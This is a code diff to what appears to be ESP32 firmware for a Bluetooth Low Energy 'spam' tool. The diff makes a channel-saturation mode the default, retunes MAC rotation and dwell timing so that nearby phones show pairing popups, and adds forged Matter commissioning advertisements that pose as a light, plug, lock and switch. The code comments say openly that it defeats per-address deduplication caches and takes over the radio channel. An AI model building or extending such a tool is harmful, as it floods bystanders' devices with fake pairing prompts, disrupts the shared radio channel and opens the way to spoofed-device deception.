@@ -32,7 +32,7 @@ static bt_spam_gap_sync_t gap_sync = {
     .completed = 0,
     .last_event = ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT,
     .last_status = ESP_BT_STATUS_SUCCESS};
-static bt_spam_mode_t current_mode = BT_SPAM_MODE_ALL;
+static bt_spam_mode_t current_mode = BT_SPAM_MODE_SATURATE;
 static bool gap_callback_registered = false;
 
 /* Chained GAP callback for other modules (e.g., bt_gattc) */
@@ -52,14 +52,16 @@ static size_t min_free_heap_during_spam = 0;
    deduplication caches that the rotating address exists to defeat. */
 #define SPAM_MAC_ROTATION_CYCLES 8
 
-/* Saturation-mode timing. Its goal is channel occupancy, not pairing popups: the
-   dwell is cut to one 50 ms slice so a new payload hits the air ~5x faster, the
-   MAC rotates every 2 cycles to defeat per-address dedup caches, and the
-   advertising interval is pinned to the 20/20 ms connectable floor. */
-#define SPAM_MAC_ROTATION_CYCLES_SATURATE 2
-#define SPAM_DWELL_SLICES 5
-#define SPAM_DWELL_SLICES_SATURATE 1
-#define SPAM_ADV_INTERVAL_SATURATE 0x20
+/* Saturation-mode timing. It keeps the 20/20 ms connectable interval (the
+   20 ms floor) so the advertising stream stays dense, but MAC identity and
+   dwell need popup-friendly windows: a peer needs a stable address long
+   enough to see the same advertisement repeatedly and open a popup, so the
+   MAC rotates only after several model cycles (not every second 50 ms
+   dwell, which defeated per-address popup maturation). */
+#define SPAM_MAC_ROTATION_CYCLES_SATURATE 20
+#define SPAM_DWELL_SLICES                 5
+#define SPAM_DWELL_SLICES_SATURATE        2
+#define SPAM_ADV_INTERVAL_SATURATE        0x20
 
 /*
  * ADV_TYPE_IND (connectable undirected advertising) allows adv_int down to 20ms
@@ -81,6 +83,7 @@ typedef enum {
   SPAM_TYPE_GOOGLE_FAST_PAIR,
   SPAM_TYPE_MICROSOFT_SWIFT,
   SPAM_TYPE_SAMSUNG_SETUP,
+  SPAM_TYPE_MATTER_SETUP,
 } spam_packet_type_t;
 
 typedef struct {
@@ -485,11 +488,48 @@ static const spam_model_t spam_models[] = {
     SPAM_SAMSUNG_BUDS(0x01, 0x17, 0x16, "Sleek Black Buds2"),
 
     /* =========================================================================
-     * 6. GENERIC ADVERTISING (Stealth mode) - No pairing popups
-     * These are standard BLE advertisements that don't trigger any
-     * platform-specific pairing modals. Useful for testing/measurement.
+     * 6. MATTER COMMISSIONING ONBOARDING (CSA Matter Specification)
+     * 16-bit Service UUID: 0xFFF6
+     * Advertised by uncommissioned Matter accessories (Bulb, Plug, Lock,
+     * Switch)
      * =========================================================================
      */
+    {
+        .name = "Matter Light",
+        .type = SPAM_TYPE_MATTER_SETUP,
+        .len = 31,
+        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0xf6, 0xff, 0x0b,
+                 0x16, 0xf6, 0xff, 0x00, 0x00, 0x0f, 0xf1, 0xff,
+                 0x01, 0x80, 0x00, 0x0b, 0x09, 'M',  'a',  't',
+                 't',  'e',  'r',  '-',  'L',  'u',  'x'},
+    },
+    {
+        .name = "Matter Plug",
+        .type = SPAM_TYPE_MATTER_SETUP,
+        .len = 31,
+        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0xf6, 0xff, 0x0b,
+                 0x16, 0xf6, 0xff, 0x00, 0x10, 0x0f, 0xf1, 0xff,
+                 0x02, 0x80, 0x00, 0x0b, 0x09, 'M',  'a',  't',
+                 't',  'e',  'r',  '-',  'S',  'o',  'c'},
+    },
+    {
+        .name = "Matter Lock",
+        .type = SPAM_TYPE_MATTER_SETUP,
+        .len = 31,
+        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0xf6, 0xff, 0x0b,
+                 0x16, 0xf6, 0xff, 0x00, 0x20, 0x0f, 0xf1, 0xff,
+                 0x03, 0x80, 0x00, 0x0b, 0x09, 'M',  'a',  't',
+                 't',  'e',  'r',  '-',  'K',  'e',  'y'},
+    },
+    {
+        .name = "Matter Switch",
+        .type = SPAM_TYPE_MATTER_SETUP,
+        .len = 31,
+        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0xf6, 0xff, 0x0b,
+                 0x16, 0xf6, 0xff, 0x00, 0x30, 0x0f, 0xf1, 0xff,
+                 0x04, 0x80, 0x00, 0x0b, 0x09, 'M',  'a',  't',
+                 't',  'e',  'r',  '-',  'T',  'o',  'g'},
+    },
 };
 
 #define TOTAL_SPAM_MODELS (sizeof(spam_models) / sizeof(spam_models[0]))
@@ -508,7 +548,8 @@ static bool model_matches_mode(const spam_model_t* model, bt_spam_mode_t mode) {
       return (model->type == SPAM_TYPE_MICROSOFT_SWIFT);
     case BT_SPAM_MODE_SAMSUNG:
       return (model->type == SPAM_TYPE_SAMSUNG_SETUP);
-    case BT_SPAM_MODE_ALL:
+    case BT_SPAM_MODE_MATTER:
+      return (model->type == SPAM_TYPE_MATTER_SETUP);
     case BT_SPAM_MODE_SATURATE:
     default:
       return true;
@@ -838,10 +879,9 @@ static void start_adv(void* pvParameters) {
      *    neither a stable identity nor a usable connection window, so no popup
      *    ever appeared. Payload changes are pushed on the fly instead, which
      *    keeps the radio advertising continuously. */
-    bool rotate_mac =
-        (cycle_count % (current_mode == BT_SPAM_MODE_SATURATE
-                            ? SPAM_MAC_ROTATION_CYCLES_SATURATE
-                            : SPAM_MAC_ROTATION_CYCLES)) == 0;
+    bool rotate_mac = (cycle_count % (current_mode == BT_SPAM_MODE_SATURATE
+                                          ? SPAM_MAC_ROTATION_CYCLES_SATURATE
+                                          : SPAM_MAC_ROTATION_CYCLES)) == 0;
 
     if (rotate_mac || !is_advertising_active) {
       drain_sem();
@@ -917,7 +957,9 @@ static void start_adv(void* pvParameters) {
      *    saturation mode cuts the dwell to one slice: it owns the channel,
      *    so a shorter cycle maximises advertising occupancy in the air. */
     if (current_mode == BT_SPAM_MODE_SATURATE) {
-      vTaskDelay(pdMS_TO_TICKS(50));
+      for (int i = 0; i < SPAM_DWELL_SLICES_SATURATE && running_task; i++) {
+        vTaskDelay(pdMS_TO_TICKS(50));
+      }
     } else {
       for (int i = 0; i < SPAM_DWELL_SLICES && running_task; i++) {
         vTaskDelay(pdMS_TO_TICKS(50));
@@ -975,6 +1017,9 @@ void bt_spam_app_main(bt_spam_mode_t mode) {
   ret = radio_lease_ble_acquire();
   if (ret != ESP_OK) {
     ESP_LOGE(TAG, "could not acquire the BLE stack: %s", esp_err_to_name(ret));
+    if (display_records_cb != NULL) {
+      display_records_cb("BLE Acq Fail");
+    }
     return;
   }
 
